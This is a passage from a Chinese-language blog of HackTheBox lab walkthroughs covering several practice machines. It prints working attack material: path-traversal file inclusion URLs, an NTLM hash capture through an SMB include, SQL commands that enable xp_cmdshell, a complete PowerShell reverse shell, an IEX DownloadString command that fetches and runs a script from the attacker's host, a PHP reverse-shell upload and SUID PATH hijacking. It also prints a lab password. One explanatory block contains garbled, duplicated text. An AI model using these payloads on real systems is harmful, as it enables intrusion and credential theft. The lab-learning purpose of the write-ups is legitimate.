(把域名解析到另外一个域名)解析出域名后，再进行下一次域名解析来访问</p><p><strong>查看网站有哪些功能</strong></p><p>查看网站功能<br>测试 web 应用程序可以重点关注交互功能，我们能控制哪些输入，又如何被后端处理，会不会以及怎么输出? 静态的网站基本上不会有漏洞的</p><p>点了点网站，也是很常见的公司产品官网(?不知道怎么分类，就是静态页面为主)，只有一个留言功能和一个语言切换功能有数据包请求，剩下都是由前端完成资源锚点跳转的</p><p>请求这两个功能分别是两个 html 页面的请求，但是都是跳转到首页最上方</p><p><strong>简单来说就是这里的话只有点击切换语言和发送评论功能才会有跳转，其他都是静态页面</strong></p><p><img src="../images/image-20230403161618815.png" alt="image-20230403161618815"></p><p>点击切换语言的时候，会有这个东西出现，感觉有点<strong>文件包含</strong>的意思</p><p><strong>探测漏洞—文件包含</strong></p><p>到这里有一个 <code>page</code> 参数，输入文件名，那么这个地方比较大可能存在的漏洞就是文件包含漏洞，我们在初级靶场也接触过，测试一下？</p><p>随便输入，发现报错返回了路径，使用的 <code>xampp</code>，一种比较常用的一键式集成环境搭建的网站，默认是将脚本文件放到 <code>xampp/htdocs</code> 目录下运行</p><p><img src="../images/image-20230403162422210.png" alt="image-20230403162422210"></p><p>很明显的windows环境 出现了  <code>C://</code></p><p>有什么特殊的敏感文件吗? 我们可以尝试查看 <code>hosts</code> 文件   <a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt">敏感文件</a></p><p><img src="../images/image-20230403163615076.png" alt="image-20230403163615076"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p>直接用盘符也行</p><p><img src="../images/image-20230403163704273.png" alt="image-20230403163704273"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=C://windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p>那么如何进一步利用呢？两种思路，一是写入或包含远程后门文件，然后连接，还有是继续信息收集 <code>windows</code> 系统的账号密码信息，进行登录</p><p>我们测试一下远程文件包含，我们知道远程文件包含还需要两个条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include、allow_url_fopen 为 ON</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403164006812.png" alt="image-20230403164006812"></p><p>发现没开，所以说明远程文件包含也用不了了</p><p>那么咱就继续进行信息收集去</p><p>我们知道这个⽹⻚容易受到⽂件包含漏洞的影响，并且在 Windows 机器上提供服务。因此，存在在我们的攻击者⼯作站上包含⽂件的可 能性。如果我们选择像 <strong>SMB</strong> 这样的协议，Windows 将尝试对我们的机器进⾏⾝份验证，并且我们可以捕获NetNTLMv2.</p><p><strong>利用 SMB 窃取 NTLM hash</strong></p><p><img src="../images/image-20230403201415201.png" alt="image-20230403201415201"></p><p><img src="../images/image-20230403201426613.png" alt="image-20230403201426613"></p><p><img src="../images/image-20230403201445815.png" alt="image-20230403201445815"></p><p><strong>SMB 协议支持 NTLM 和 LM 加密，我们通过恶意程序监听，在远程主机访问我们的 SMB 服务时，因为要进行身份验证，会发送相关信息，我们就可以获取目标主机的 hash 值，这个是为了账号密码的安全性，一般都不进行明文验证，而是使用摘要值进行比对，这样就给了我们可乘之机，不需要知道正确的账号密码，只要摘要值比对成功就可以登录</strong></p><p><strong>下载工具，使用其进行监听</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull https://github.com/lgandx/Responder </span><br></pre></td></tr></table></figure><p>确认是否支持 SMB 请求</p><p><img src="../images/image-20230403202210015.png" alt="image-20230403202210015"></p><p>监听 <code>tun0</code> ,之前有一次靶机提到过，该 IP 是和目标机器一个网络下的 10 段 IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Responder.py -I tun0 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403202438515.png" alt="image-20230403202438515"></p><p><img src="../images/image-20230403202457127.png" alt="image-20230403202457127"></p><p>我们使用 <code>curl</code> 命令来请求 <code>url</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://unika.htb/index.php?page=//10.129.158.196/csd </span><br></pre></td></tr></table></figure><p>这里的话要拿<code>tun0</code>的ip地址</p><p>不是拿题目的ip地址</p><p>我们发现成功接收到服务器的的 <code>NTLM</code> 值,一般是第一次请求才会发送，然后会保存到本地，下次就不会再发送了</p><p>接下来不写了   弹不成功，获得不了请求</p><p><strong>wp</strong></p><p><a href="https://blog.csdn.net/qq_40927195/article/details/124418613?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168050613316800226520463%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168050613316800226520463&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-124418613-null-null.142^v81^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=responder%20htb&amp;spm=1018.2226.3001.4187">文章1</a></p><p><a href="blob:https://app.hackthebox.com/77561ee0-b632-4b11-820a-27746092a7a3">文章2</a>    ——&gt;   可能打不开   这是在hackthebox里面的官方文档，本地的<code>1.pdf</code>是中文翻译过来的</p><h2 id="three"><a href="#three" class="headerlink" title="three"></a>three</h2><p>考点</p><p><img src="../images/image-20230404202036676.png" alt="image-20230404202036676"></p><p>还是老样子，先ping一下</p><p><img src="../images/image-20230404202059303.png" alt="image-20230404202059303"></p><p>接下来就行端口扫描</p><p><img src="../images/image-20230404202338133.png" alt="image-20230404202338133"></p><p>扫到了两个端口</p><p>扫描发现开放 22 和 80 两个端口，22 是 <code>ssh</code> 服务，登录分为账号密码登录和<a href="https://so.csdn.net/so/search?q=公钥&amp;spm=1001.2101.3001.7020">公钥</a>登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip</span><br><span class="line">ssh ip</span><br></pre></td></tr></table></figure><p>没有登录成功，看80端口</p><p>是一个乐队的官网，apache2.4.29 、linux 系统、php ，功能有搜索，买票，联系我们，不过都只是做个页面，<strong>没有实际的请求交互</strong></p><p>尝试目录爬取和爆破，没有什么有用的信息…</p><p>Email: <strong>mail@thetoppers.htb</strong> 看到了邮箱，然后把靶机 ip 和域名进行绑定，然后进行子域名爆破，不要问为什么这么做，学着点就行了</p><p><img src="../images/image-20230404210616587.png" alt="image-20230404210616587"></p><p>发现只有这个域名有用，但我们直接访问这个域名的时候却没有打开这个网址，应该就是没有配置hosts的原因，和上面的<code>Responder</code>是一个考点</p><p>修改后是直接能访问这个网址的</p><p>子域名爆破，这个问题，因为我们现在只能解析靶机IP和它对应的域名，子域名如何解析？即使是同一个IP的子域名，在没有修改 <code>hosts</code> 文件时也是无法访问的，工具又是如何判断爆破的子域名存在呢？</p><p>使用 <code>gobuster</code> 爆破，字典也是从别的工具里借用的，但是字典太大了，就提前结束了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -w /usr/share/wordlists/domain_dic.txt -u http://thetoppers.htb</span><br></pre></td></tr></table></figure><p> 反正就是找到了一个子域名</p><p><code>s3.thetoppers.htb</code></p><p>vhost 的主要功能是枚举某个服务上部署的所有虚拟主机，其原理是通过构造 HTTP 请求头，将字典中的域名设置到 HTTP 请求头到 HOST 字段，然后通过 IP 请求网站，如果是该域名的虚拟主机，那么请求会返回该域名下的网站内容，如果不是，则返回通过 IP 访问获得的资源而非域名下的资源</p><p>然后接下来还是修改hosts</p><p><img src="../images/image-20230404221641973.png" alt="image-20230404221641973"></p><p><img src="../images/image-20230404221721024.png" alt="image-20230404221721024"></p><p>成功了</p><p><img src="../images/image-20230404221802636.png" alt="image-20230404221802636"></p><p>使用的 <code>hypercorn</code> 这是一个 <code>ASGI</code> 服务器，启用后监听8000端口云云，不用了解太多</p><p>ASGI（异步服务器网关接口）是<a href="https://so.csdn.net/so/search?q=WSGI&amp;spm=1001.2101.3001.7020">WSGI</a>的精神继承者，旨在在具有异步功能的Python Web服务器，框架和应用程序之间提供标准接口</p><p><strong>AWS S3 拿shell</strong></p><p><code>s3</code> 👉 <code>AWS S3</code> 全名是 <code>Amazon Simple Storage Service</code> ，简便的对象存储服务，存储的数据类似键值对的形式，就是对象名：数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install awscli       // 安装工具 </span><br><span class="line">aws configure            // 配置</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406091400477.png" alt="image-20230406091400477"></p><p>前两项配置是用户凭证，通过什么身份连接到 <code>AWS</code> 存储库，第三个是区域信息，第四个是输出格式，为什么都是 <code>temp</code> 我也不懂，可能是设置的</p><p>通过工具访问并执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls</span><br><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406091950627.png" alt="image-20230406091950627"></p><p>发现存在.htaccess，文件上传对这个很熟悉，然后我们就尝试进行文件上传看看‘</p><p><img src="../images/image-20230406092738942.png" alt="image-20230406092738942"></p><p>上传成功 成功获取 <code>webshell</code> 权限 </p><p>这里没复现成功 。。。。。</p><h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><p>考点</p><p><img src="../images/image-20230407142721508.png" alt="image-20230407142721508"></p><p><strong>工具介绍</strong><br><strong>smbclient</strong><br>Smbclient(samba client)是基于SMB协议的,用于存取共享目标的客户端程序。<br>参数：</p><p>网络资源 网络资源的格式为//服务器名称/资源分享名称。</p><p>密码 输入存取网络资源所需的密码。</p><p>-B 传送广播数据包时所用的IP地址。</p><p>-d&lt; 排错层级&gt; 指定记录文件所记载事件的详细程度。</p><p>-E 将信息送到标准错误输出设备。</p><p>-h 显示帮助。</p><p>-i&lt; 范围&gt; 设置NetBIOS名称范围。</p><p>-I 指定服务器的IP地址。</p><p>-l&lt; 记录文件&gt; 指定记录文件的名称。</p><p>-L 显示服务器端所分享出来的所有资源。</p><p>-M 可利用WinPopup协议，将信息送给选项中所指定的主机。</p><p>-n 指定用户端所要使用的NetBIOS名称。</p><p>-N 不用询问密码。</p><p>-O&lt; 连接槽选项&gt; 设置用户端TCP连接槽的选项。</p><p>-p 指定服务器端TCP连接端口编号。</p><p>-R&lt; 名称解析顺序&gt; 设置NetBIOS名称解析的顺序。</p><p>-s&lt; 目录&gt; 指定smb.conf所在的目录。</p><p>-t&lt; 服务器字码&gt; 设置用何种字符码来解析服务器端的文件名称。</p><p>-T 备份服务器端分享的全部文件，并打包成tar格式的文件。</p><p>-U&lt; 用户名称&gt; 指定用户名称。</p><p>-W&lt; 工作群组&gt; 指定工作群组名称。</p><p><strong>psexec</strong><br><strong>用于远程连接的工具</strong></p><p>还是先ping一下</p><p><img src="../images/image-20230407142755841.png" alt="image-20230407142755841"></p><p>接下来时扫一下端口</p><p><img src="../images/image-20230407143003810.png" alt="image-20230407143003810"></p><p><strong>这里面的135和139端口没啥用</strong></p><p><strong>对445端口进行检测</strong></p><p>smbclient -L // -L 列出所有共享用户</p><p><img src="../images/image-20230407143417585.png" alt="image-20230407143417585"></p><p>这里时空密码登录，存在backups匿名用户，可进行登录</p><p><img src="../images/image-20230407143638426.png" alt="image-20230407143638426"></p><p>匿名登录成功后，然后下载当前目录下的文件进行查看</p><p><img src="../images/image-20230407144159804.png" alt="image-20230407144159804"></p><p>可以看到这个文件是<strong>sqlserver</strong>的配置文件</p><p><img src="../images/image-20230407143745285.png" alt="image-20230407143745285"></p><p>存在数据库账号密码，然后就去查看1433端口，这个端口存在数据库</p><p><strong>检测1433端口</strong></p><p>拿到了<strong>SQLSERVER</strong>的密码和账号，我们可以尝试登陆sqlserver<br>登录sqlserver似乎有很多工具，我使用的是impacket包example文件夹中的mssqlclient.py脚本，主要是刚好最近在学习内网时用到<br>要使用impacket包要要先安装impacket工具包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">sudo pip3 install .</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407144746945.png" alt="image-20230407144746945"></p><p>成功登录数据库</p><p>查看<code>SELECT IS_SRVROLEMEMBER ( &#39;sysadmin &#39; )</code>，发现是SA权限</p><p><img src="../images/image-20230407145741555.png" alt="image-20230407145741555"></p><p><img src="../images/image-20230407145843746.png" alt="image-20230407145843746"></p><p>因此我们可以尝试使用<code>xp_cmdshell</code>来获取RCE</p><p>使用的函数为xp_cmdshell(能帮助我们拿到主机的shell)，xp_cmdshell存储过程在 SQL Server 2005以后默认关闭，需要手动开启<br>开启xp_cmdshell命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; //开启高级选项</span><br><span class="line">RECONFIGURE; //配置生效</span><br><span class="line">exec sp_configure&#x27;xp_cmdshell&#x27;, 1; //开启xp_cmdshell</span><br><span class="line">RECONFIGURE; //配置生效</span><br></pre></td></tr></table></figure><p>可以通过exec sp_configure查看xp_cmdshell状态：<br><code>exec sp_configure</code></p><p><img src="../images/image-20230407150243802.png" alt="image-20230407150243802"></p><p>能成功执行代表配置成功了</p><p>看一下权限和ip</p><p><img src="../images/image-20230407150500391.png" alt="image-20230407150500391"></p><p>成功执行命令</p><p>然后其实我们就可以通过RCE直接读取到位于sql_svc用户桌面的flag，但是为了提高难度决定要拿到shell<br>通过RCE可以判断出目标电脑没有安装java、php、python等主流编程语言，也没有安装netcat，所以有一些反弹shell的方法无法做到</p><p><img src="../images/image-20230407150700760.png" alt="image-20230407150700760"></p><p>所以打算用<strong>powershell</strong>的脚本进行反弹shell<br>尝试使用了nishang的反弹，但是没有成功，而且在这个函数下很多命令都无法正常的执行，最后只能用简单的ps1的脚本进行反弹</p><p>折腾了半天，才把shell弹成功</p><p><img src="../images/image-20230407154522057.png" alt="image-20230407154522057"></p><p>先创建一个文件  shell.ps1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">client = New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.14.8&quot;</span>,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在文件所在目录开一个python web服务器给sqlserver访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>然后监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>最后在sql那边输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.21/shell.ps1\&quot;);&quot;&quot;</span><br></pre></td></tr></table></figure><p>然后就反弹成功，就可以求拿普通用户的flag了</p><p>此 flag 放在普通用户的桌面 （Windows下读取文件内容的命令为 type）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\Desktop\user.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407154856367.png" alt="image-20230407154856367"></p><p>接下来就是提权了   就是为了拿到管理员账户的flag</p><p><strong>提权</strong></p><p>获取的当前用户是 svc 用户，用于运行数据库。管理员权限需要再获取。</p><p><strong>本靶场提权的思路是，查看 powershell 的命令执行记录获取密码。</strong></p><p>密码存储在ConsoleHost_history.txt中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p>这里可以打开自己的windows电脑来查看，位置是一样的</p><p><img src="../images/image-20230407155250444.png" alt="image-20230407155250444"></p><p>可以看到这里使用net use 开放了一个文件共享 </p><p>该命令的作用是将主机上的backups文件夹映射到自己的T盘，后面是主机的用户名和密码。</p><p><strong>使用psexec提权，其原理是：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.通过ipc$连接，释放psexecsvc.exe到目标</span><br><span class="line"> </span><br><span class="line">2.通过服务管理SCManager远程创建psexecsvc服务，并启动服务。</span><br><span class="line"> </span><br><span class="line">3.客户端连接执行命令，服务端启动相应的程序并执行回显数据。</span><br><span class="line"> </span><br><span class="line">4.运行完后删除服务。这个在windows的日志中有详细的记录，另外psexec在少数情况下会出现服务没删除成功的bug。</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>另起终端执行</p><p>这个执行命令和ssh差不多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec administrator@10.129.32.130</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407155626594.png" alt="image-20230407155626594"></p><p>拿到机器的管理员shell</p><p><img src="../images/image-20230407155835471.png" alt="image-20230407155835471"></p><p>拿到管理员的flag了</p><p><img src="../images/image-20230407155913391.png" alt="image-20230407155913391"></p><p>折腾了好久终于结束了。。。。。。</p><p><strong>总结</strong></p><p>通过nmap扫描发现存在 445，1433开放。smbclient 列出目标smb共享用户发现可以匿名访问，发现数据库账号密码 通过impacket 里的mssqlclient 连接上<br>发现是sa权限 获得命令执行 通过python3 搭建简易web服务器<br>让目标下载powershell脚本并执行 在目标桌面发现第一个flag 查看powershell历史记录。直接看见管理员账户密码，再用impacket里的psexec连接。</p><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><p>考点</p><p><img src="../images/image-20230407160549375.png" alt="image-20230407160549375"></p><p>还是先ping一下</p><p><img src="../images/image-20230407163342232.png" alt="image-20230407163342232"></p><p>能ping成功，开始扫一下端口</p><p><img src="../images/image-20230407163658165.png" alt="image-20230407163658165"></p><p>扫到两个端口，80端口的version看起来像一个可以访问的网址</p><p>ssh先去尝试一下能不能无密码连接</p><p>发现不能后访问一下网站</p><p><img src="../images/image-20230407164019071.png" alt="image-20230407164019071"></p><p>就是一个静态页面</p><p>访问80端口后，使用小插件获取到 login 的敏感路径。（叫 findsomething ,火狐及Chrome均可在对应插件商店下载）</p><p><img src="../images/image-20230407164340474.png" alt="image-20230407164340474"></p><p>找到有个敏感登录路径</p><p><img src="../images/image-20230407164509757.png" alt="image-20230407164509757"></p><p>得到一个登录框</p><p>发现可使用 guest 账户登录。猜测进去后越权。</p><p><strong>越权</strong></p><p><img src="../images/image-20230407164712966.png" alt="image-20230407164712966"></p><p>成功登进去后</p><p><img src="../images/image-20230407164800998.png" alt="image-20230407164800998"></p><p>发现有个upload提示只有管理员才可以进行上传，我们查看下cookie，看可不可以伪造cookie进行admin登录</p><p><img src="../images/image-20230407164938115.png" alt="image-20230407164938115"></p><p>发现可以伪造cookie进行登录</p><p> 尝试更改role 为admin，再访问 upload 功能，仍无法打开。则应是通过 user 的值判断是否为admin</p><p>那 admin 的值为多少呢？ 我第一反应是爆破。后来发现思路不对。正确思路是在 account 模块下发现了</p><p><img src="../images/image-20230407165104564.png" alt="image-20230407165104564"></p><p>这样就能获取到admin的accessid了</p><p>更改下方 user 的 value 值为 34322 ，访问 upload 模块</p><p><img src="../images/image-20230407165220653.png" alt="image-20230407165220653"></p><p>成功伪造成管理员账户了，那么我们就尝试进行上传木马看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure><p>将ip修改后就行了</p><p><img src="../images/image-20230407172124011.png" alt="image-20230407172124011"></p><p><img src="../images/image-20230407171925546.png" alt="image-20230407171925546"></p><p>上传成功木马文件，然后我们就去扫一下网站目录，看一下上传目录在哪，然后去访问上传目录的木马就可以反弹shell了(使用gobuster工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir --url http://10.129.95.204/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407173155112.png" alt="image-20230407173155112"></p><p>扫到了uploads文件，估计就是这个目录存在上传文件，然后我们直接去访问看看</p><p><img src="../images/image-20230407174631148.png" alt="image-20230407174631148"></p><p>访问后成功反弹shell</p><p><img src="../images/image-20230407174723910.png" alt="image-20230407174723910"></p><p> /var/www/html 是web服务的目录，即网站的目录。这里的 cdn-cgi目录下发现了 db.php</p><p>里面有连接数据库的账户密码</p><p><img src="../images/image-20230407174809784.png" alt="image-20230407174809784"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robert</span><br><span class="line">M3g4C0rpUs3r!</span><br></pre></td></tr></table></figure><p>在 robert 的用户目录，发现他的flag</p><p><img src="../images/image-20230407174929348.png" alt="image-20230407174929348"></p><p>拿到普通用户的flag</p><p><strong>提权</strong></p><p><a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权</a></p><p>这里考点就是这个提权</p><p>目前拿到的是www-data用户的bash的执行权(执行 whoami 查看即可)、以及一个数据库的账户密码。因为在 home 文件夹下也发现了此账户，猜测此账户的密码与其数据库密码一致。</p><p>配合最开始的ssh端口，想到先远程登录一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh robert@10.129.95.204</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407175212192.png" alt="image-20230407175212192"></p><p>登录成功，果然和数据库的账户密码是一样的</p><p> 如果未开放ssh端口，仍要从 bash 转换为 伪终端，可执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p> 再切换到 robert账户。不过这样不稳定，毕竟还是基于反弹shell连接的。</p><p><img src="../images/image-20230407175356208.png" alt="image-20230407175356208"></p><p>如何获得 root 权限呢？在上一个靶场中，我们通过查看 powershell 的命令记录获取到 Administrator 的权限，这次使用 SUID提权的方法。</p><p><a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p><p>在本靶场中，如果 robert 用户执行的文件从属于 root 用户，就会用root用户的权限执行文件。</p><p>查看 robert 所在用户组、搜索可执行的文件、并查看该文件有没有 s 权限</p><p>s权限就是看是否含有suid权限，有的话就可以利用来进行提权了</p><p><strong>查找是否含有s权限</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>find / -perm -4000 2&gt;/dev/null 查找具有suid权限的文件<br>2&gt;/dev/null<br>意思就是把错误输出到“黑洞”，/dev/null被称为黑洞</p><p>0——标准输入（stdin）<br>1——标准输出（stdout）<br>2——标准错误（stderr）</p><p><img src="../images/image-20230407175648124.png" alt="image-20230407175648124"></p><p>找到一个有用的了</p><p>bugtracker 这里会通过输入的数字来显示 bug<br><strong>输入一个不存在的数字 这里显示了cat 不到</strong><br>这里是用root权限去调用cat</p><p><img src="../images/image-20230407175915391.png" alt="image-20230407175915391"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用cat命令没有使用cat命令的绝对路径，而是使用绝对路径调用的，即在当前用户的 P A T H 环 境 变 量 指 定 的 路 径 中 搜 寻 c a t 命 令 。 可 以 创 建 一 个 名 为 c a t 的 恶 意 命 令 ， 并 修 改 当 前 用 户 的 PATH环境变量指定的路径中搜寻cat命令。 可以创建一个名为cat的恶意命令，并修改当前用户的 PATH环境变量指定的路径中搜寻cat命令。可以创建一个名为cat的恶意命令，并修改当前用户的PATH值以使bugtracker调用恶意cat命令，以获取root权限。</span><br><span class="line">切换到robert用户身份，将/tmp目录设置为P A T H 环 境 变 量 的 第 一 个 目 录 ， 切 换 到 / t m p 目 录 下 构 造 恶 意 c a t 命 令 并 赋 予 执 行 权 限 。 当 b u g t r a c k e r 再 次 调 用 c a t 命 令 时 实 际 上 调 用 的 是 / t m p 目 录 下 的 恶 意 c a t 命 令 （ s h e l l 执 行 命 令 时 按 照 PATH环境变量的第一个目录，切换到/tmp目录下构造恶意cat命令并赋予执行权限。当bugtracker再次调用cat命令时实际上调用的是/tmp目录下的恶意cat命令（shell执行命令时按照PATH环境变量的第一个目录，切换到/tmp目录下构造恶意cat命令并赋予执行权限。当bugtracker再次调用cat命令时实际上调用的是/tmp目录下的恶意cat命令（shell执行命令时按照PATH环境变量中目录的顺序搜索，搜索到即开始执行），此时robert用户临时具有了root权限，上面的id命令可以看出只是robert用户的uid变为了root，不是真正的root用户。</span><br></pre></td></tr></table></figure><p>简单来说就是因为调用cat命令的时候使用path里面搜索的，从前往后依次搜索，谁在前有就调用谁的，所以问们就可以自己定义一个路径在最前面，然后里面有cat命令，然后就会以uid(root)用户的身份执行cat</p><p>现在如果我们伪装 “/bin/bash” 为 cat，那么执行 此程序时，就会获得 root权限的shell</p><p><img src="../images/image-20230407180615180.png" alt="image-20230407180615180"></p><p>这样的话/tmp就在最前面了</p><p><img src="../images/image-20230407180936729.png" alt="image-20230407180936729"></p><p><img src="../images/image-20230407181013708.png" alt="image-20230407181013708"></p><p>这里不能使用cat的原因是cat被我们修改了</p><h2 id="vaccine"><a href="#vaccine" class="headerlink" title="vaccine"></a>vaccine</h2><p>考点</p><p><img src="../images/image-20230408152244023.png" alt="image-20230408152244023"></p><p><img src="../images/image-20230408152401774.png" alt="image-20230408152401774"></p><p>能ping通</p><p>去扫一下端口</p><p><img src="../images/image-20230408152523785.png" alt="image-20230408152523785"></p><p>扫到三个端口   一个是ftp服务器端口   一个是ssh端口  一个是80端口(看起来像是一个网站)</p><p>然后还是老思路尝试一下可不可以进行匿名登录</p><p><img src="../images/image-20230408152820068.png" alt="image-20230408152820068"></p><p>匿名登录成功</p><p>查看文件,竟然有压缩包,看这名称,大概率是源码,下载</p><p><img src="../images/image-20230408153021471.png" alt="image-20230408153021471"></p><p>然后尝试进行解压查看</p><p><img src="../images/image-20230408153128680.png" alt="image-20230408153128680"></p><p>发现需要密码才能查看源码</p><p>尝试ssh登录，不行，有密码且不是弱类型密码</p><p><img src="../images/image-20230408153321269.png" alt="image-20230408153321269"></p><p>没有头绪后查看一下这个网址，发现是这个登录框，于是尝试一下万能密码登录，弱密码  sqlmap啥的   发现不太行</p><p><img src="../images/image-20230408153614411.png" alt="image-20230408153614411"></p><p>然后尝试一下扫一下这个网站的目录看有没有啥发现   也没啥可用的东西  那么我们就尝试一下破解压缩包的密码</p><p>没别的,暴破,使用在 <code>Responder</code> 接触过的 <code>john</code> 工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 